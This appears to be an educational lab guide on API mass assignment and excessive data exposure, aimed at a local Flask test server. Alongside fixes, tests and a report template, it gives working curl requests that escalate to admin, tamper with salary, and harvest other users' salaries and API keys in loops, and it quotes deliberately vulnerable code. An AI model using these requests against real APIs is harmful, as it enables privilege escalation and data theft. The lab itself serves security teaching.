# API03: Mass Assignment Lab - Complete Instructions

## Table of Contents
- [Part 1: Understanding the Vulnerabilities](#part-1-understanding-the-vulnerabilities)
- [Part 2: Exploitation Exercises](#part-2-exploitation-exercises)
- [Part 3: Remediation Exercises](#part-3-remediation-exercises)
- [Part 4: Testing and Validation](#part-4-testing-and-validation)
- [Part 5: Advanced Scenarios](#part-5-advanced-scenarios)

---

## Part 1: Understanding the Vulnerabilities

### Setup Verification

First, ensure the lab is running:

```bash
# Start the lab
docker-compose up -d

# Verify it's running
curl http://localhost:5003/
# Should return: {"message": "API03 Mass Assignment Lab"}

# Check health
curl http://localhost:5003/api/health
# Should return: {"status": "healthy"}
```

### Exercise 1.1: Examine the Vulnerable Code

Open `app/server.py` and locate these vulnerable patterns:

```python
# VULNERABILITY 1: Excessive Data Exposure
@app.route('/api/users/<int:user_id>')
def get_user(user_id):
    user = users_db.get(user_id)
    return jsonify(user)  # ❌ Returns ALL fields!

# VULNERABILITY 2: Mass Assignment
@app.route('/api/users/<int:user_id>', methods=['PUT'])
def update_user(user_id):
    data = request.json
    # ❌ Accepts ALL fields from user input
    for key, value in data.items():
        if key in user and key != 'id':
            user[key] = value
```

**Questions to Answer:**
1. What sensitive fields are exposed in the user object?
2. Which fields should be read-only?
3. What could an attacker do with this information?

### Exercise 1.2: Understand the Data Model

Review the user data structure:

```python
{
    "id": 1,
    "username": "alice",
    "email": "alice@example.com",
    "password_hash": "$2b$12$...",  # ❌ Should be hidden
    "is_admin": False,               # ❌ Should be hidden
    "salary": 65000,                 # ❌ Should be hidden
    "role": "user",                  # ❌ Should be restricted
    "api_key": "key_user_alice",     # ❌ Should be hidden
    "created_at": "2024-01-15"
}
```

**Identify:**
- ✅ Public fields (safe to expose to all users)
- ⚠️ Private fields (only visible to owner or admin)
- ❌ Sensitive fields (should never be exposed)
- 🔒 Restricted fields (should never be user-modifiable)

---

## Part 2: Exploitation Exercises

### Exercise 2.1: Discover Excessive Data Exposure

**Objective**: Identify sensitive fields exposed in API responses

**Steps:**

1. Register a new user:

```bash
curl -X POST http://localhost:5003/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "email": "hacker@example.com",
    "password": "password123"
  }'
```

2. Login to get a token:

```bash
curl -X POST http://localhost:5003/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "password": "password123"
  }'
```

Save the token from the response:
```bash
export TOKEN="eyJ0eXAiOiJKV1QiLCJhbGc..."
```

3. Request your own profile:

```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/users/me | jq
```

**Expected Finding:**
```json
{
  "id": 4,
  "username": "hacker",
  "email": "hacker@example.com",
  "password_hash": "$2b$12$...",    // ❌ EXPOSED!
  "is_admin": false,                 // ❌ EXPOSED!
  "salary": 50000,                   // ❌ EXPOSED!
  "role": "user",
  "api_key": "key_user_hacker",      // ❌ EXPOSED!
  "created_at": "2024-01-17"
}
```

**Questions:**
1. Which fields should NOT be visible?
2. What could an attacker do with the password_hash?
3. What's the risk of exposing the api_key?

### Exercise 2.2: Harvest Sensitive Data from Other Users

**Objective**: Enumerate user IDs to collect sensitive information

**Steps:**

1. Try accessing other user profiles:

```bash
# Alice's profile (ID: 1)
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/users/1 | jq

# Bob's profile (ID: 2)
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/users/2 | jq

# Admin's profile (ID: 3)
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/users/3 | jq
```

2. Extract salary information:

```bash
# Create a script to harvest all salaries
for id in {1..10}; do
  echo -n "User $id salary: "
  curl -s -H "Authorization: Bearer $TOKEN" \
    http://localhost:5003/api/users/$id | \
    jq -r '.salary // "N/A"'
done
```

**Expected Output:**
```
User 1 salary: 65000
User 2 salary: 70000
User 3 salary: 150000
User 4 salary: 50000
```

**Impact Assessment:**
- Privacy violation (exposing salaries)
- Competitive intelligence (identifying admins)
- Compliance risk (GDPR, data protection laws)

### Exercise 2.3: Exploit Mass Assignment for Privilege Escalation

**Objective**: Gain admin privileges by modifying the `is_admin` field

**Steps:**

1. Verify current user is NOT admin:

```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/users/me | jq '.is_admin'
# Output: false
```

2. Attempt to access admin endpoint (should fail):

```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/admin/users
# Expected: {"error": "Admin access required"}, 403
```

3. Update profile with `is_admin: true`:

```bash
curl -X PUT http://localhost:5003/api/users/4 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "is_admin": true,
    "role": "admin"
  }'
```

4. Verify privilege escalation succeeded:

```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/users/me | jq '.is_admin'
# Output: true
```

5. Access admin endpoint (should now succeed):

```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/admin/users | jq
```

**Success Criteria:**
- ✅ User gained admin privileges
- ✅ Can access admin-only endpoints
- ✅ Role changed to "admin"

**Impact:**
- Complete system compromise
- Access to all user data
- Ability to modify other users
- Potential data destruction

### Exercise 2.4: Financial Fraud via Salary Manipulation

**Objective**: Modify your salary through mass assignment

**Steps:**

1. Check current salary:

```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/users/me | jq '.salary'
# Output: 50000
```

2. Update salary to $500,000:

```bash
curl -X PUT http://localhost:5003/api/users/4 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "salary": 500000
  }'
```

3. Verify salary change:

```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/users/me | jq '.salary'
# Output: 500000
```

**Impact:**
- Financial fraud
- Payroll manipulation
- Accounting discrepancies
- Business logic bypass

### Exercise 2.5: API Key Theft

**Objective**: Steal other users' API keys

**Steps:**

1. Extract all API keys:

```bash
# Script to harvest API keys
echo "Harvested API Keys:"
for id in {1..10}; do
  result=$(curl -s -H "Authorization: Bearer $TOKEN" \
    http://localhost:5003/api/users/$id)
  username=$(echo $result | jq -r '.username // "N/A"')
  api_key=$(echo $result | jq -r '.api_key // "N/A"')
  if [ "$api_key" != "N/A" ]; then
    echo "  $username: $api_key"
  fi
done
```

**Expected Output:**
```
Harvested API Keys:
  alice: key_user_alice
  bob: key_user_bob
  admin: key_admin_admin
  hacker: key_user_hacker
```

**Impact:**
- Account impersonation
- Unauthorized API access
- Session hijacking
- Identity theft

---

## Part 3: Remediation Exercises

### Exercise 3.1: Implement DTOs with Marshmallow

**Objective**: Create proper Data Transfer Objects to control field exposure

**Task**: Modify `app/server.py` to add Marshmallow schemas

1. Add Marshmallow import:

```python
from marshmallow import Schema, fields, validate, ValidationError
```

2. Create DTOs before the routes:

```python
# Data Transfer Objects (DTOs)

class UserPublicSchema(Schema):
    """Public user profile - safe for all authenticated users"""
    id = fields.Int(dump_only=True)
    username = fields.Str()
    email = fields.Email()
    created_at = fields.Str()
    # password_hash NOT included
    # is_admin NOT included
    # salary NOT included
    # api_key NOT included

class UserPrivateSchema(UserPublicSchema):
    """User's own profile - includes private info"""
    role = fields.Str()
    # Still no password_hash, is_admin, salary

class UserAdminSchema(UserPrivateSchema):
    """Admin view - includes admin-only fields"""
    is_admin = fields.Bool()
    salary = fields.Int()
    # Still no password_hash or api_key

class UserUpdateSchema(Schema):
    """Fields users can update"""
    username = fields.Str(validate=validate.Length(min=3, max=50))
    email = fields.Email()
    # is_admin NOT allowed
    # salary NOT allowed
    # role NOT allowed
```

3. Update the `get_user` endpoint:

```python
@app.route('/api/users/<int:user_id>')
@token_required
def get_user(current_user, user_id):
    user = users_db.get(user_id)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    # Choose schema based on relationship and role
    if current_user.get('is_admin'):
        schema = UserAdminSchema()
    elif current_user.get('id') == user_id:
        schema = UserPrivateSchema()
    else:
        schema = UserPublicSchema()
    
    return jsonify(schema.dump(user))
```

4. Update the `get_me` endpoint:

```python
@app.route('/api/users/me')
@token_required
def get_me(current_user):
    schema = UserPrivateSchema()
    return jsonify(schema.dump(current_user))
```

**Test Your Fix:**

```bash
# Restart the application
docker-compose restart

# Get new token
curl -X POST http://localhost:5003/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "alice", "password": "password123"}'

export TOKEN="<new_token>"

# Test that sensitive fields are now hidden
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/users/me | jq

# Should NOT contain: password_hash, is_admin, salary, api_key
```

### Exercise 3.2: Prevent Mass Assignment

**Objective**: Implement field allowlisting for updates

**Task**: Secure the update endpoint

```python
@app.route('/api/users/<int:user_id>', methods=['PUT'])
@token_required
def update_user(current_user, user_id):
    # Authorization check
    if current_user['id'] != user_id and not current_user.get('is_admin'):
        return jsonify({'error': 'Forbidden'}), 403
    
    user = users_db.get(user_id)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    
    # Validate input using schema
    schema = UserUpdateSchema()
    try:
        data = schema.load(request.json)
    except ValidationError as err:
        return jsonify({'errors': err.messages}), 400
    
    # Only update allowed fields
    for key, value in data.items():
        user[key] = value
    
    # Return filtered response
    response_schema = UserPrivateSchema()
    return jsonify(response_schema.dump(user))
```

**Test Your Fix:**

```bash
# Try to escalate privileges (should fail)
curl -X PUT http://localhost:5003/api/users/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "alice_updated",
    "is_admin": true,
    "salary": 999999
  }'

# Verify is_admin and salary were NOT updated
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:5003/api/users/me | jq '{is_admin, salary}'

# Should return null for both (not exposed) or original values
```

### Exercise 3.3: Implement Role-Based Field Filtering

**Objective**: Different users see different fields based on their role

**Task**: Already implemented in Exercise 3.1, now test it:

```bash
# As regular user, view another user's profile
curl -H "Authorization: Bearer $ALICE_TOKEN" \
  http://localhost:5003/api/users/2 | jq

# Should only see: id, username, email, created_at

# As admin, view a user's profile
curl -H "Authorization: Bearer $ADMIN_TOKEN" \
  http://localhost:5003/api/users/1 | jq

# Should see additional fields: is_admin, salary
# But still NOT: password_hash, api_key
```

### Exercise 3.4: Add Field-Level Authorization

**Objective**: Prevent even admins from seeing certain sensitive fields

**Task**: Create a helper function for sensitive field access

```python
def can_access_sensitive_field(current_user, target_user, field_name):
    """Check if user can access sensitive field"""
    sensitive_fields = ['password_hash', 'api_key']
    
    if field_name in sensitive_fields:
        # Never expose these fields
        return False
    
    admin_only_fields = ['is_admin', 'salary']
    if field_name in admin_only_fields:
        # Only admins or self can see
        return current_user.get('is_admin') or current_user['id'] == target_user['id']
    
    return True
```

### Exercise 3.5: Implement Read-Only Fields

**Objective**: Ensure certain fields can never be modified via API

**Task**: Add validation to prevent modification of read-only fields

```python
class UserUpdateSchema(Schema):
    """Fields users can update"""
    username = fields.Str(validate=validate.Length(min=3, max=50))
    email = fields.Email()
    
    # Read-only fields (marked with dump_only in full schema)
    # These won't be accepted in load()
    
class UserSchema(Schema):
    """Full schema with read-only fields"""
    id = fields.Int(dump_only=True)  # Cannot be set
    created_at = fields.Str(dump_only=True)  # Cannot be modified
    is_admin = fields.Bool(dump_only=True)  # Cannot be self-modified
    salary = fields.Int(dump_only=True)  # Cannot be self-modified
    # ... other fields ...
```

**Test:**

```bash
# Try to modify read-only fields
curl -X PUT http://localhost:5003/api/users/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "alice",
    "id": 999,
    "created_at": "2020-01-01",
    "is_admin": true
  }'

# Verify id and created_at were NOT changed
```

---

## Part 4: Testing and Validation

### Exercise 4.1: Automated Security Tests

**Objective**: Create automated tests to verify fixes

Create `test_security.py`:

```python
import requests
import pytest

BASE_URL = "http://localhost:5003"

class TestExcessiveDataExposure:
    
    def test_no_password_hash_in_response(self, user_token):
        """Verify password_hash is not exposed"""
        response = requests.get(
            f"{BASE_URL}/api/users/me",
            headers={"Authorization": f"Bearer {user_token}"}
        )
        assert response.status_code == 200
        data = response.json()
        assert 'password_hash' not in data
    
    def test_no_api_key_in_response(self, user_token):
        """Verify api_key is not exposed"""
        response = requests.get(
            f"{BASE_URL}/api/users/me",
            headers={"Authorization": f"Bearer {user_token}"}
        )
        assert response.status_code == 200
        data = response.json()
        assert 'api_key' not in data
    
    def test_salary_hidden_from_regular_users(self, user_token):
        """Regular users should not see other users' salaries"""
        response = requests.get(
            f"{BASE_URL}/api/users/2",
            headers={"Authorization": f"Bearer {user_token}"}
        )
        assert response.status_code == 200
        data = response.json()
        assert 'salary' not in data

class TestMassAssignment:
    
    def test_cannot_escalate_privileges(self, user_token, user_id):
        """Verify users cannot set is_admin to true"""
        response = requests.put(
            f"{BASE_URL}/api/users/{user_id}",
            headers={"Authorization": f"Bearer {user_token}"},
            json={
                "username": "hacker",
                "is_admin": True
            }
        )
        
        # Get updated user
        response = requests.get(
            f"{BASE_URL}/api/users/me",
            headers={"Authorization": f"Bearer {user_token}"}
        )
        
        # is_admin should not be visible or should be False
        data = response.json()
        assert data.get('is_admin') != True
    
    def test_cannot_modify_salary(self, user_token, user_id):
        """Verify users cannot modify their salary"""
        response = requests.put(
            f"{BASE_URL}/api/users/{user_id}",
            headers={"Authorization": f"Bearer {user_token}"},
            json={
                "username": "test",
                "salary": 999999
            }
        )
        
        # Salary should not be modifiable
        # (Implementation should ignore this field)
        assert response.status_code in [200, 400]

# Run tests
# pytest test_security.py -v
```

Run the tests:

```bash
pytest test_security.py -v
```

### Exercise 4.2: Manual Penetration Testing

**Checklist:**

- [ ] Try to access `/api/users/<id>` for other users
  - [ ] Verify sensitive fields are hidden
  - [ ] Verify role-based filtering works
  
- [ ] Try mass assignment attacks
  - [ ] Attempt to set `is_admin: true`
  - [ ] Attempt to modify `salary`
  - [ ] Attempt to change `role`
  - [ ] Attempt to modify `id`
  
- [ ] Test with different user roles
  - [ ] Regular user viewing public profile
  - [ ] User viewing own profile
  - [ ] Admin viewing user profile
  
- [ ] Test input validation
  - [ ] Invalid email format
  - [ ] Username too short
  - [ ] Unexpected fields in request

### Exercise 4.3: Verify All Fixes

**Complete Verification Script:**

```bash
#!/bin/bash

echo "=== API03 Security Verification ==="
echo

# Login as regular user
echo "1. Testing as regular user..."
ALICE_TOKEN=$(curl -s -X POST http://localhost:5003/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r '.token')

# Test excessive data exposure
echo "2. Checking for sensitive field exposure..."
RESPONSE=$(curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
  http://localhost:5003/api/users/me)

if echo $RESPONSE | jq -e '.password_hash' > /dev/null; then
  echo "   ❌ FAIL: password_hash is exposed"
else
  echo "   ✅ PASS: password_hash is hidden"
fi

if echo $RESPONSE | jq -e '.api_key' > /dev/null; then
  echo "   ❌ FAIL: api_key is exposed"
else
  echo "   ✅ PASS: api_key is hidden"
fi

# Test mass assignment
echo "3. Testing mass assignment prevention..."
curl -s -X PUT http://localhost:5003/api/users/1 \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","is_admin":true}' > /dev/null

UPDATED=$(curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
  http://localhost:5003/api/users/me)

if echo $UPDATED | jq -e '.is_admin == true' > /dev/null; then
  echo "   ❌ FAIL: Mass assignment allowed privilege escalation"
else
  echo "   ✅ PASS: Mass assignment prevented"
fi

echo
echo "=== Verification Complete ==="
```

Save as `verify.sh`, make executable, and run:

```bash
chmod +x verify.sh
./verify.sh
```

---

## Part 5: Advanced Scenarios

### Exercise 5.1: GraphQL Over-Fetching Prevention

If you extend the lab with GraphQL, implement field-level resolvers:

```python
import graphene

class UserType(graphene.ObjectType):
    id = graphene.Int()
    username = graphene.String()
    email = graphene.String()
    is_admin = graphene.Boolean()
    salary = graphene.Int()
    
    @staticmethod
    def resolve_is_admin(parent, info):
        current_user = info.context.get('current_user')
        if not current_user or not current_user.get('is_admin'):
            return None  # Hide from non-admins
        return parent.get('is_admin')
    
    @staticmethod
    def resolve_salary(parent, info):
        current_user = info.context.get('current_user')
        if not current_user:
            return None
        # Only show to self or admin
        if current_user['id'] != parent['id'] and not current_user.get('is_admin'):
            return None
        return parent.get('salary')
```

### Exercise 5.2: Batch Operations Security

Secure batch update endpoints:

```python
@app.route('/api/users/batch', methods=['PUT'])
@token_required
@admin_required
def batch_update_users(current_user):
    """Only admins can batch update"""
    data = request.json
    schema = UserUpdateSchema()
    
    updated = []
    errors = []
    
    for user_data in data.get('users', []):
        user_id = user_data.get('id')
        user = users_db.get(user_id)
        
        if not user:
            errors.append({'id': user_id, 'error': 'Not found'})
            continue
        
        try:
            validated = schema.load(user_data)
            user.update(validated)
            updated.append(user_id)
        except ValidationError as err:
            errors.append({'id': user_id, 'errors': err.messages})
    
    return jsonify({
        'updated': updated,
        'errors': errors
    })
```

### Exercise 5.3: Audit Logging for Sensitive Fields

Add logging for sensitive field access:

```python
import logging

def log_sensitive_access(user_id, field_name, accessor_id):
    """Log access to sensitive fields"""
    logging.warning(
        f"Sensitive field access: User {accessor_id} accessed "
        f"field '{field_name}' of user {user_id}"
    )

@app.route('/api/users/<int:user_id>')
@token_required
def get_user(current_user, user_id):
    user = users_db.get(user_id)
    
    # Log if admin views sensitive data
    if current_user.get('is_admin'):
        log_sensitive_access(user_id, 'salary', current_user['id'])
    
    # ... rest of implementation
```

---

## 🎯 Success Criteria

You've successfully completed all exercises when:

### Part 1: Understanding
- ✅ Identified all sensitive fields in the data model
- ✅ Understood the difference between excessive exposure and mass assignment
- ✅ Can explain the business impact of each vulnerability

### Part 2: Exploitation
- ✅ Successfully harvested sensitive data from API responses
- ✅ Achieved privilege escalation via mass assignment
- ✅ Manipulated salary and other restricted fields
- ✅ Stolen API keys from other users

### Part 3: Remediation
- ✅ Implemented DTOs with Marshmallow
- ✅ Added field allowlisting for updates
- ✅ Implemented role-based field filtering
- ✅ Prevented modification of read-only fields

### Part 4: Validation
- ✅ All automated tests pass
- ✅ Manual penetration tests fail to exploit vulnerabilities
- ✅ Verification script shows all checks passing

---

## 📝 Lab Report Template

Document your findings:

```markdown
# API03 Mass Assignment Lab Report

## Vulnerabilities Found

### 1. Excessive Data Exposure
- **Endpoint**: GET /api/users/<id>
- **Sensitive Fields Exposed**: password_hash, is_admin, salary, api_key
- **Impact**: Privacy violation, credential theft, information disclosure
- **CVSS Score**: 7.5 (High)

### 2. Mass Assignment
- **Endpoint**: PUT /api/users/<id>
- **Exploitable Fields**: is_admin, salary, role
- **Impact**: Privilege escalation, financial fraud
- **CVSS Score**: 9.1 (Critical)

## Exploitation Demonstrated

1. Harvested salary data for all users
2. Escalated privileges to admin
3. Modified salary from $50,000 to $500,000
4. Accessed admin-only endpoints

## Remediation Implemented

1. Created DTOs (UserPublicSchema, UserPrivateSchema, UserAdminSchema)
2. Implemented field allowlisting (UserUpdateSchema)
3. Added role-based filtering
4. Prevented read-only field modification

## Testing Results

- ✅ All sensitive fields now hidden
- ✅ Mass assignment attacks prevented
- ✅ Role-based access working correctly
- ✅ Read-only fields protected

## Lessons Learned

1. Never serialize database models directly
2. Always use explicit field allowlists
3. Separate read and write schemas
4. Test with multiple user roles
```

---

## 🎓 Key Takeaways

1. **Excessive Data Exposure** occurs when APIs return more fields than necessary
2. **Mass Assignment** allows attackers to modify restricted fields
3. **DTOs** are essential for controlling field exposure and modification
4. **Role-based filtering** ensures users see only appropriate data
5. **Field allowlisting** prevents unauthorized property modifications
6. **Testing** must cover multiple user roles and attack vectors

---

## 🔗 Additional Resources

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [Marshmallow Documentation](https://marshmallow.readthedocs.io/)
- [Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)

---

**Congratulations!** You've completed the API03 Mass Assignment Lab. You now understand how to identify, exploit, and remediate property-level authorization vulnerabilities.

---

*Part of the [OWASP API Security Top 10 Educational Repository](../../../README.md)*
